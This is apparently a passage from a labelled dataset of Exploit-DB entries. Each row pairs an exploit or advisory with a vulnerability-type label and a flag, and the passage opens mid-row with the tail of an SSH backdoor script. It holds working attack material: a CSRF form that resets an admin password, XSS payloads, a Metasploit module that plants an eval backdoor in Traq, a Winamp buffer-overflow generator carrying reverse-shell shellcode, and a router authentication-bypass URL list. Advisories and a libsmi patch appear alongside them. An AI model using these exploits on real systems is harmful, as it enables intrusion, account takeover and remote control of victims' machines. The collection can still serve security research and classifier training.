sys.stdout.flush()                 except socket.timeout:                     pass             if sys.stdin in r:                 x = sys.stdin.read(1)                 if len(x) == 0:                     break                 chan.send(x)      finally:         termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)   if __name__ == '__main__':     main()",SSH Backdoor Access,1
43862,"RSVP Invitation Online 1.0 - Cross-Site Request Forgery (Update Admin) <!-- # # # # #  # Exploit Title: RSVP Invitation Online 1.0 - Cross-Site Request Forgery (Update Admin Pass) # Dork: N/A # Date: 23.01.2018 # Vendor Homepage: http://putrazendrato.link/ # Software Link: https://www.codegrape.com/item/rsvp-invitation-online/3890 # Demo: http://putrazendrato.link/rsvp/login.php # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: CVE-2018-5976 # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # #  # Proof of Concept: # 1) --> <html> <body> <form method=""post"" action=""http://localhost/rsvp/function/account.php""> <!--Change admin pass--> <input name=""newpassword"" type=""text"" value=""efe""> <!--Change admin pass confirm--> <input name=""confirm"" type=""text"" value=""efe""> <input type=""submit"" name=""Submit"" value=""Update""> </form> </body> </html>",Cross-Site Request Forgery,1
22043,"phpBB 2.0.3 - Script Injection source: https://www.securityfocus.com/bid/6248/info  phpBB does not properly sanitize user input in forum postings. This could allow a malicious user to inject script code into a forum post which would in turn be executed when the page is viewed by other users.  Script code would be executed in the security context of the phpBB site.  Supplied script code may access authentication credentials, or take actions as an authenticated user.  <b onMouseOver=""alert(document.location);"">This piece of text could be dangerous if you were to move your mouse over it!</b>  <i onClick=""alert(document.location);"">This piece of text could be dangerous if you were to click it!</i>  <u onClick=""alert('Hello');"">This piece of text could be dangerous if you were to click it!</u>",Script Injection,1
34707,"RadAFFILIATE Links - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/43459/info  RadAFFILIATE Links is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/links_style1/?id_category=1&feat=1%00""&#039;><ScRiPt%20%0a%0d>alert(310243950025)%3B</ScRiPt> http://www.example.com/links_style1/index.php?id_category=0&feat=1>""><ScRiPt %0A%0D>alert(325194346916)%3B</ScRiPt>",Cross-Site Scripting,1
30883,"BitDefender AntiVirus 2008 - 'bdelev.dll' ActiveX Control Double-Free source: https://www.securityfocus.com/bid/26824/info  A BitDefender Antivirus 2008 ActiveX control is prone a double-free vulnerability because of a flaw in the way that the 'bdelev.dll' library handles certain object data prior to returning it.  Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.  this.Oleaut32 = new Array(); this.Oleaut32[""cache""] = new Array(); this.base = ""A""; while (base.length<0x8000) base+= base; this.base = base.substring (0, (0x8000-6)/2); CollectGarbage(); 3 // Fill the cache with block of maximum size for (i=0;i<6;i++) { this.Oleaut32[""cache""].push(base.substring (0, (0x20-6)/2)); this.Oleaut32[""cache""].push(base.substring (0, (0x40-6)/2)); this.Oleaut32[""cache""].push(base.substring (0, (0x100-6)/2)); this.Oleaut32[""cache""].push(base.substring (0, (0x8000-6)/2)); } this.bitdefender = new ActiveXObject('bdelev.ElevatedHelperClass.1'); // free cache of oleaut32 delete Oleaut32[""cache""]; CollectGarbage(); // POC for (pid=0;pid<4000;pid+=4) { try { // Find first Module_Path var Module_Path = bitdefender.Proc_GetName_PSAPI (pid); // Display the original string in free block memory /////////////////////////////////////////////////// alert (Module_Path); -> C:\Windows\... (exemple) ///////////////////// // Uses free block var y = base.substring(0,Module_Path.length); // Display the result of the crushing of the memory /////////////////////////////////////////////////// alert (Module_Path); -> AAAAAAAAAAAA... ///////////////////// break; } catch(e) {} }",denial-of-service,1
42740,"iBall ADSL2+ Home Router - Authentication Bypass # Exploit Title: iBall ADSL2+ Home Router Authentication Bypass Vulnerability # CVE: CVE-2017-14244 # Date: 15-09-2017 # Exploit Author: Gem George # Author Contact: https://www.linkedin.com/in/gemgrge # Vulnerable Product: iBall ADSL2+ Home Router WRA150N https://www.iball.co.in/Product/ADSL2--Home-Router/746 # Firmware version: FW_iB-LR7011A_1.0.2 # Vendor Homepage: https://www.iball.co.in # Reference: https://www.techipick.com/iball-baton-adsl2-home-router-utstar-wa3002g4-adsl-broadband-modem-authentication-bypass   Vulnerability Details ====================== iBall ADSL2+ Home Router does not properly authenticate when pages are accessed through cgi version. This could potentially allow a remote attacker access sensitive information and perform actions such as reset router, downloading backup configuration, upload backup etc.  How to reproduce =================== Suppose 192.168.1.1 is the router IP and one of the valid page in router is is  http://192.168.1.1/abcd.html, then the page can be directly accessed as as http://192.168.1.1/abcd.cgi  Example URLs: * http://192.168.1.1/info.cgi – Status and details * http://192.168.1.1/upload.cgi – Firmware Upgrade * http://192.168.1.1/backupsettings.cgi – perform backup settings to PC * http://192.168.1.1/pppoe.cgi – PPPoE settings * http://192.168.1.1/resetrouter.cgi – Router reset * http://192.168.1.1/password.cgi – password settings  POC ========= * https://www.youtube.com/watch?v=_SvrwCSdn54    -----------------------Greetz---------------------- ++++++++++++++++++ www.0seccon.com ++++++++++++++++++  Saran,Jithin,Dhani,Vignesh,Hemanth,Sudin,Vijith,Joel",Authentication Bypass,1
15293,"LibSMI smiGetNode - Buffer Overflow When Long OID Is Given In Numerical Form -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1                   Core Security Technologies - CoreLabs Advisory                             http://corelabs.coresecurity.com/  LibSMI smiGetNode Buffer Overflow When Long OID Is Given In Numerical Form   1. *Advisory Information*  Title: LibSMI smiGetNode Buffer Overflow When Long OID Is Given In Numerical Form Advisory Id: CORE-2010-0819 Advisory URL: http://www.coresecurity.com/content/libsmi-smigetnode-buffer-overflow Date published: 2010-10-20 Date of last update: 2010-10-20 Vendors contacted: Libsmi team Release mode: Coordinated release   2. *Vulnerability Information*  Class: Failure to Constrain Operations within the Bounds of a Memory Buffer [CWE-119] Impact: Code execution Remotely Exploitable: Yes Locally Exploitable: Yes CVE Name: CVE-2010-2891 Bugtraq ID: N/A   3. *Vulnerability Description*  A statically allocated buffer is overwritter in the case that a very long Object Identifier is specified in stringified dotted notation to the smiGetNode function of libsmi[1]. This may result in arbitraty code execution by cleverly overwriting key pointers in memory.   4. *Vulnerable packages*     . libsmi 0.4.8.    . Any software that uses the vulnerable function to find a definition from an Object Indentifier specified in stringified dotted notation that is given by the user. The SNMP packets from the protocol that travel over the network do not use this notation for OIDs.   5. *Non-vulnerable packages*     . libsmi 0.4.8 patched with the supplied patch.    . Any future release of libsmi, or current SVN head revision, since this patch was already commited to their repositories.   6. *Vendor Information, Solutions and Workarounds*  This patch was supplied by Juergen Schoenwaelder and fixes the bug:  /----- Index: lib/smi.c =================================================================== - --- lib/smi.c    (revision 29144) +++ lib/smi.c    (working copy) @@ -1793,10 +1793,15 @@      }        if (isdigit((int)node2[0])) { - -    for (oidlen = 0, p = strtok(node2, "". ""); p; +    for (oidlen = 0, p = strtok(node2, "". ""); +         p && oidlen < sizeof(oid)/sizeof(oid[0]);           oidlen++, p = strtok(NULL, "". "")) {          oid[oidlen] = strtoul(p, NULL, 0);      } +    if (p) { +        /* the numeric OID is too long */ +        return NULL; +    }      nodePtr = getNode(oidlen, oid);      if (nodePtr) {          if (modulePtr) { - -----/   7. *Credits*  This vulnerability was discovered and researched by Andrés López Luksenberg [http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=researcher&name=Andres_Lopez_Luksenberg] from Core Security Technologies. The publication of this advisory was coordinated by Pedro Varangot [http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=researcher&name=Pedro_Varangot].    8. *Technical Description / Proof of Concept Code*  The 'smiGetNode' function returns a 'SmiNode' struct given the name of a OID as a 'char *' in both either numeric (i.e. ""1.3.6.1.2.1.4.17"") or human readable format (i.e. ""ipForwarding""). This function uses a static array of 128 elements of type 'unsigned int' to hold the OID in numeric format:  /-----     SmiSubid        oid[128]; - -----/  Note that 'SmiSubid' is a 'typedef' of 'unsigned int'.  This array is populated by a loop that calls 'strtok' and then subsecuently 'strtoul' in the case that the OID supplied as a 'char *' was in the form of subsecuent numbers separated by a period.  /-----     if (isdigit((int)node2[0])) {       for (oidlen = 0, p = strtok(node2, "". ""); p;             oidlen++, p = strtok(NULL, "". "")) {         oid[oidlen] = strtoul(p, NULL, 0);       }     } - -----/  That loop clearly overwrites past 'oid' boundaries when the string contained in 'node2' has more that 128 dots ("".""). This constitutes a classical overflow that can likely be leveraged into arbitrary code execution reliably.  To verify if the version on 'libsmi' installed on a unix based system is vulnerable, the code example (smisubtree) from 'man libsmi'[2] can be used. This programs calls 'smiGetNode' in the following way in line 17:  /-----     for((smiNode = smiGetNode(NULL, argv[1])) &&} - -----/  The program crashes when called via commandline with an OID with more than 128 numeric tokens, like the OID outputed by the following Python script:  /-----     #!/usr/bin/python      # run ./smisubtree `./libsmicrash.py`      if __name__ == ""__main__"":             s = """"             for i in xrange(158):                     s = s + ""1.""              print s} - -----/   9. *Report Timeline*  . 2010-09-06: Core Security Technologies contacts Vincent Bernat, the Debian Package Maintainer for libsmi, informing that a bug has been found in libsmi. Core Security Technologies asks for a security contact in upstream stating that finding a reliable one using Google or looking at mailing lists was difficult.  . 2010-09-06: Vincent Bernat, the Debian Package Maintainer for libsmi, replies with two e-mail of aledged developers of libsmi, Juergen Schoenwaelder and Frank Strauss.  . 2010-09-07: Core Security Technologies contacts Juergen Schoenwaelder and Frank Strauss at their supplies e-mail addresses, telling about a found vulnerability and offering an advisory draft in either plain or encripted form.  . 2010-09-07: Frank Strauss' e-mail address bounces Core Security Technologies' e-mail back, informing about a new e-mail address. Core Security Technologies sends the message again to the new address.  . 2010-09-07: Juergen Schoenwaelder replies with his PGP keys, and copies Vincent Bernat again in the conversation.  . 2010-09-09: Core Security Technologies sends and encripted draft of this advisory to Juergen Schoenwaelder and Vincent Bernat, with apologies due to the delay caused by Pedro Varangot [http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=researcher&name=Pedro_Varangot] being on leave due to health issues. The advisory draft mentions Net-SNMP as possible vulnerabile software.  . 2010-09-11: Juergen Schoenwaelder replies with a patch fixing the vulnerability, and correcting some tecnical information in the advisory draft regarding the impact of the vulnerability, stating that it is likely low and that Net-SNMP is not affected.  . 2010-09-27: Core Security Technologies replies to Juergen Schoenwaelder and Vincent Bernat agreeing that the impact of the vulnerability is low and removes the mention of Net-SNMP in the avisory. Core Security Technologies asks for a timeline regarding the release of a fixed version of libsmi stating that this advisory will be released anyway, because someone may be using libsmi in his software introducing a vulnerability he may not know about. No reply is received for this e-mail.  . 2010-10-04: Core Security Technologies notifies Juergen Schoenwaelder and Vincent Bernat that October the 18th has been set as a tentative release date for this advisory, and that the release date is open to discussion if commitment to release a fixed version of libsmi in a given timeframe is given.  . 2010-10-08: Juergen Schoenwaelder replies with sugestions for the vulnerable packages and vendor information section of this advisory. He also mentions that Core Security Technologies should go with the October de 18th release date for this advisory.  . 2010-10-08: Core Security Technologies incorporates Juergen Schoenwaelder's suggestions to the advisory, and again mentions that the advisory can be rescheduled if it is deemed necesary by the vendor.  . 2010-10-20: Advisory CORE-2010-0819 is released.   10. *References*  [1] [http://www.ibr.cs.tu-bs.de/projects/libsmi/] [2] [http://www.ibr.cs.tu-bs.de/projects/libsmi/libsmi.html]   11. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: [http://corelabs.coresecurity.com/].   12. *About Core Security Technologies*  Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at [http://www.coresecurity.com].   13. *Disclaimer*  The contents of this advisory are copyright (c) 2010 Core Security Technologies and (c) 2010 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: [http://creativecommons.org/licenses/by-nc-sa/3.0/us/]   14. *PGP/GPG Keys*  This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at [http://www.coresecurity.com/files/attachments/core_security_advisories.asc].  -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.9 (MingW32) Comment: GnuPT v3.6.3 Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/   iEYEARECAAYFAky/P9oACgkQyNibggitWa0K3gCgoQyq4J1uKs2NadmnaKqQ14sB ScYAnRyR1Gs5APN0CDENMjOLMJwXdPt2 =35zG -----END PGP SIGNATURE-----",Buffer Overflow,1
18239,"Traq 2.3 - Authentication Bypass / Remote Code Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info={}) 		super(update_info(info, 			'Name'           => 'Traq <= 2.3 Authentication Bypass / Remote Code Execution Exploit', 			'Description'    => %q{ 				This module exploits an arbitrary command execution vulnerability in 				Traq 2.0 to 2.3. It's in the admincp/common.php script.  				This function is called in each script located into /admicp/ directory to 				make sure the user has admin rights, but this is a broken authorization 				schema due to the header() function doesn't stop the execution flow. This 				can be exploited by malicious users to execute admin functionality resulting 				for  e.g.  in execution of arbitrary PHP code leveraging of plugins.php 				functionality. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'EgiX',  # Vulnerability discovery and exploit 					'TecR0c' # Metasploit Module 				], 			'References'     => 				[ 					[ 'URL', 'http://www.exploit-db.com/exploits/18213/' ], 					[ 'URL', 'http://traqproject.org/' ], 				], 			'Privileged'     => false, 			'Payload'        => 				{ 					'Keys'        => ['php'], 					'Space'       => 4000, 					'DisableNops' => true, 				}, 			'Platform'       => ['php'], 			'Arch'           => ARCH_PHP, 			'Targets'        => [[ 'Automatic', {} ]], 			'DisclosureDate' => 'Dec 12 2011', 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptString.new('URI', [true, ""The path to the Traq installation"", ""/""]), 			],self.class) 	end  	def check 		uri = datastore['URI'] 		uri += (datastore['URI'][-1, 1] == ""/"") ? ""admincp/login.php"" : ""/admincp/login.php""  		res = send_request_raw( 			{ 				'uri'=> uri 			}, 25)  		if (res and res.body =~ /Powered by Traq 2.[0-3]/ ) 			return Exploit::CheckCode::Vulnerable 		end 		return Exploit::CheckCode::Safe 	end  	def exploit 		p = Rex::Text.encode_base64(payload.encoded)  		uri = datastore['URI'] 		uri += (datastore['URI'][-1, 1] == ""/"") ? ""admincp/plugins.php?newhook"" : ""/admincp/plugins.php?newhook""  		res = send_request_cgi( 			{ 				'method'    => 'POST', 				'uri'       => uri, 				'vars_post' => 					{ 						'plugin_id' => '1', 						'title' => '1', 						'execorder' => '0', 						'hook' => 'template_footer', 						'code' => 'error_reporting(0);eval(base64_decode($_SERVER[HTTP_CMD]));die;' 					} 			}, 25)  		uri = datastore['URI'] 		uri += (datastore['URI'][-1, 1] == ""/"") ? ""index.php"" : ""/index.php""  		res = send_request_cgi( 			{ 				'method'  => 'GET', 				'uri'     => uri, 				'headers' => 					{ 						'CMD' => p, 						'Connection' => 'Close', 					}, 			}, 25) 	end end",arbitrary command execution,1
35612,"Winamp 5.6.1 - '.m3u8' Remote Buffer Overflow source: https://www.securityfocus.com/bid/47333/info  Winamp is prone to a remote buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.  Attackers can execute arbitrary code in the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.  Winamp 5.6.1 is vulnerable; other versions may also be affected.   #!/usr/bin/perl  ### # Title : Winamp 5.6.1 (.m3u8) Stack Buffer Overflow # Author : KedAns-Dz # E-mail : ked-h@hotmail.com || ked-h@exploit-id.com # Home : HMD/AM (30008/04300) - Algeria -(00213555248701) # Twitter page : twitter.com/kedans # platform : windows # Impact : Stack Overflow # Tested on : Windows XP sp3 FR ### # Note : BAC 2011 Enchallah ( Me & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all ) ## # [»] ~ special thanks to : jos_ali_joe (exploit-id.com) , and All exploit-id Team ###  my $header = ""#EXTM3U\n""; my $junk = ""\x41"" x 16240; # Buffer Junk my $eip = ""\xad\x86\x0e\x07""; # overwrite EIP - 070E86AD | FFD4 CALL ESP nde.dll my $seh = pack('V',0x10017928);  # add ESP,4404  $seh = $seh.pack('V',0x00000003); # Value de : EAX $seh = $seh.""\x41"" x 11; $seh = $seh.pack('V',0x41414141); # Value de : ECX $seh = $seh.""\x41"" x 3; $seh = $seh.pack('V',0x007EA478); # Value de : EDX $seh = $seh.""\x41"" x 22; $seh = $seh.pack('V',0x40000001); # Value de : EBX $seh = $seh.""\x41"" x 8; $seh = $seh.pack('V',0x028F1DB0); # Valeu de : ESP $seh = $seh.""\x41"" x 12; $seh = $seh.pack('V',0x77230459); # Valeu de : EBP $seh = $seh.""\x41"" x 10; $seh = $seh.pack('V',0x08FD62A8); # Valeu de : ESI $seh = $seh.""\x41"" x 11; $seh = $seh.pack('V',0x00497300); # Valeu de : EDI $seh = $seh.""\x41"" x 2; $seh = $seh.pack('V',0x08FD293C); # Valeu de : EIP $seh = $seh.""\x41"" x 5; my $nops = ""\x90"" x 100; # Nop my $space = ""\x41"" x (43492 - length($junk) - length($nops)); my $shellcode = # windows/shell_reverse_tcp (http://www.metasploit.com) ""\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48"" . ""\x50\x68\x59\x41\x41\x51\x68\x5a\x59\x59\x59\x59\x41\x41"" . ""\x51\x51\x44\x44\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58"" . ""\x56\x6a\x30\x50\x50\x54\x55\x50\x50\x61\x33\x30\x31\x30"" . ""\x38\x39\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"" . ""\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41"" . ""\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"" . ""\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x4d"" . ""\x38\x4e\x69\x47\x70\x43\x30\x45\x50\x45\x30\x4d\x59\x4a"" . ""\x45\x45\x61\x48\x52\x43\x54\x4e\x6b\x50\x52\x50\x30\x4c"" . ""\x4b\x51\x42\x46\x6c\x4e\x6b\x46\x32\x46\x74\x4c\x4b\x50"" . ""\x72\x46\x48\x46\x6f\x4f\x47\x43\x7a\x51\x36\x46\x51\x49"" . ""\x6f\x46\x51\x4f\x30\x4e\x4c\x47\x4c\x43\x51\x43\x4c\x43"" . ""\x32\x44\x6c\x47\x50\x4f\x31\x48\x4f\x46\x6d\x43\x31\x49"" . ""\x57\x48\x62\x4c\x30\x51\x42\x42\x77\x4c\x4b\x50\x52\x42"" . ""\x30\x4c\x4b\x43\x72\x45\x6c\x46\x61\x4a\x70\x4c\x4b\x43"" . ""\x70\x43\x48\x4e\x65\x4b\x70\x42\x54\x50\x4a\x45\x51\x48"" . ""\x50\x46\x30\x4e\x6b\x50\x48\x45\x48\x4e\x6b\x51\x48\x51"" . ""\x30\x45\x51\x48\x53\x48\x63\x47\x4c\x43\x79\x4e\x6b\x47"" . ""\x44\x4e\x6b\x46\x61\x4b\x66\x50\x31\x4b\x4f\x44\x71\x4f"" . ""\x30\x4e\x4c\x49\x51\x4a\x6f\x46\x6d\x46\x61\x4f\x37\x46"" . ""\x58\x4d\x30\x42\x55\x4a\x54\x46\x63\x43\x4d\x4c\x38\x47"" . ""\x4b\x51\x6d\x44\x64\x44\x35\x49\x72\x43\x68\x4c\x4b\x50"" . ""\x58\x45\x74\x47\x71\x48\x53\x51\x76\x4e\x6b\x46\x6c\x42"" . ""\x6b\x4c\x4b\x42\x78\x47\x6c\x45\x51\x48\x53\x4e\x6b\x45"" . ""\x54\x4c\x4b\x47\x71\x48\x50\x4f\x79\x42\x64\x44\x64\x47"" . ""\x54\x51\x4b\x51\x4b\x43\x51\x50\x59\x43\x6a\x46\x31\x4b"" . ""\x4f\x4d\x30\x50\x58\x43\x6f\x43\x6a\x4c\x4b\x45\x42\x48"" . ""\x6b\x4e\x66\x43\x6d\x42\x48\x50\x33\x44\x72\x45\x50\x43"" . ""\x30\x51\x78\x42\x57\x42\x53\x46\x52\x43\x6f\x50\x54\x43"" . ""\x58\x42\x6c\x44\x37\x44\x66\x45\x57\x49\x6f\x48\x55\x48"" . ""\x38\x4c\x50\x47\x71\x45\x50\x47\x70\x47\x59\x4b\x74\x51"" . ""\x44\x42\x70\x42\x48\x44\x69\x4d\x50\x42\x4b\x43\x30\x49"" . ""\x6f\x48\x55\x50\x50\x42\x70\x50\x50\x42\x70\x47\x30\x42"" . ""\x70\x43\x70\x50\x50\x43\x58\x48\x6a\x44\x4f\x49\x4f\x4d"" . ""\x30\x49\x6f\x4b\x65\x4e\x69\x48\x47\x42\x48\x43\x4f\x45"" . ""\x50\x43\x30\x47\x71\x43\x58\x43\x32\x45\x50\x44\x51\x43"" . ""\x6c\x4e\x69\x4a\x46\x51\x7a\x42\x30\x51\x46\x43\x67\x42"" . ""\x48\x4d\x49\x4e\x45\x51\x64\x51\x71\x49\x6f\x4e\x35\x50"" . ""\x68\x42\x43\x42\x4d\x42\x44\x47\x70\x4c\x49\x48\x63\x51"" . ""\x47\x51\x47\x51\x47\x50\x31\x4b\x46\x51\x7a\x47\x62\x51"" . ""\x49\x50\x56\x4d\x32\x49\x6d\x50\x66\x4f\x37\x42\x64\x46"" . ""\x44\x45\x6c\x47\x71\x43\x31\x4c\x4d\x50\x44\x51\x34\x42"" . ""\x30\x4a\x66\x43\x30\x43\x74\x50\x54\x42\x70\x43\x66\x43"" . ""\x66\x51\x46\x47\x36\x46\x36\x42\x6e\x50\x56\x46\x36\x42"" . ""\x73\x43\x66\x50\x68\x44\x39\x48\x4c\x47\x4f\x4b\x36\x4b"" . ""\x4f\x48\x55\x4c\x49\x4b\x50\x50\x4e\x42\x76\x43\x76\x49"" . ""\x6f\x50\x30\x42\x48\x43\x38\x4c\x47\x47\x6d\x43\x50\x49"" . ""\x6f\x4e\x35\x4f\x4b\x4a\x50\x4d\x65\x4d\x72\x51\x46\x51"" . ""\x78\x4d\x76\x4e\x75\x4f\x4d\x4d\x4d\x4b\x4f\x48\x55\x47"" . ""\x4c\x46\x66\x43\x4c\x45\x5a\x4b\x30\x49\x6b\x49\x70\x43"" . ""\x45\x45\x55\x4d\x6b\x51\x57\x44\x53\x43\x42\x42\x4f\x51"" . ""\x7a\x47\x70\x46\x33\x4b\x4f\x49\x45\x41\x41"";  my $end = ""\x90"" x (20000 - $nops); # Nop sled open(FILE,'>>KedAns.m3u8'); print FILE $header.$junk.$space.$seh.$nops.$eip.$shellcode.$end; close(FILE);",Remote Buffer Overflow,1
37492,"WK UDID 1.0.1 iOS - Command Injection Document Title: =============== WK UDID v1.0.1 iOS - Command Inject Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1539   Release Date: ============= 2015-07-01   Vulnerability Laboratory ID (VL-ID): ==================================== 1539   Common Vulnerability Scoring System: ==================================== 5.6   Product & Service Introduction: =============================== This app offers the opportunity to read device-specific information from your iPhone, iPad or iPod touch. The desired information can be  selected and sent via email to a recipient of your choice or it can be copied to the clipboard for later use. You can get information about  the unique identifier (UDID), the model, the name and the operating system of your device.  (Copy of the Homepage https://itunes.apple.com/us/app/wk-udid/id392624227 )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research team discovered a local command inject web vulnerability in the official WK UDID v1.0.1 iOS mobile web-application.   Vulnerability Disclosure Timeline: ================================== 2015-07-01:	Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== WK EDV GmbH Product: WK UDID - iOS Mobile Web Application 1.0.1   Exploitation Technique: ======================= Local   Severity Level: =============== Medium   Technical Details & Description: ================================ A local command inject web vulnerability has been discovered in the official WK UDID v1.0.1 iOS mobile web-application. The vulnerability allows to inject malicious script codes to the application-side of the vulnerable mobile app.  The vulnerability is located in the device name value of the send by mail function. Local attackers are able to manipulate the name value  of the device to compromise the mail function of the wkudid mobile app. The html encoding is broken in the send by mail export function.  Local attackers are able to manipulate the device name id to compromise the application internal validation in send emails. The attack vector  of the vulnerability is server-side and the injection point is the device name information settings.  The security risk of the local commandpath inject vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 5.6.  Exploitation of the commandpath inject vulnerability requires a low privilege androidios device account with restricted access and no user interaction.  Successful exploitation of the vulnerability results in unauthorized execution of system specific commands and unauthorized path value requests to  compromise the mobile iOS application and connected device components.  Vulnerable Module(s) 				[+] Device - Settings - Information   Vulnerable Parameter(s) 				[+] device name  Affected Module(s) 				[+] WKUDID - Mail   Proof of Concept (PoC): ======================= The local command inject web vulnerability can be exploited by local attackers with low privilege device user account and without user interaction. For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.  Manual steps to reproduce the vulnerability ... 1. Start the iOS device 2. Open the settings module 3. Change the name to the local command injection payload 4. Save the settings and start the application wkudid 5. Send the details by mail 6. Review the arrival inbox  7. The execution point is the xml and header location with the device name value 8. Successful reproduce of the local command inject security vulnerability!   PoC Device ID - Email  <div>Identifier (UDID): FFFFFFFFC0463E7B3E5D46A88EDF4194C74B27D1 <br>Model: iPad<br>Name: bkm337>""<./[LOCAL COMMAND INJECT VULNERABILITY VIA DEVICE NAME VALUE!]"">%20<gt;<BR> System Name: iPhone OS<BR>System Version: 8.3<BR>Total Memory (RAM): 987.98 MB<BR> Free Memory: 19.06 MB<BR>Total Storage: 27.19 GB<BR>Free Storage: 0.70 GB<BR> CPU Frequency: an error occured<BR>Network: WiFi<BR>Wi-Fi: 02:00:00:00:00:00<BR> IP Address: 192.168.2.104<BR>Carrier: not available<BR></iframe></div>   Solution - Fix & Patch: ======================= The vulnerability can be patched by a secure parse and encode of the vulnerable Device name value. Restrict the input and encode the output in the  vulnerable generated html file. Disallow script code values in the html generated file type to prevent further command injection attacks.   Security Risk: ============== The security rsik of the local command inject web vulnerability in the device name value is estimated as medium. (CVSS 5.6)   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed  or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable  in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab  or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for  consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses,  policies, deface websites, hack into databases or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to  electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website  is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact  (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™  --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt",local command inject web,0
42249,"Adobe Flash - ATF Parser Heap Corruption Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1216  The attached file causes heap corruption in the ATF parser. To reproduce the issue, copy atffree.atf and LoadImage.swf to a server, and visit http://127.0.0.1/LoadImage.swf?img=atffree.png.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42249.zip",Parser Heap Corruption,1
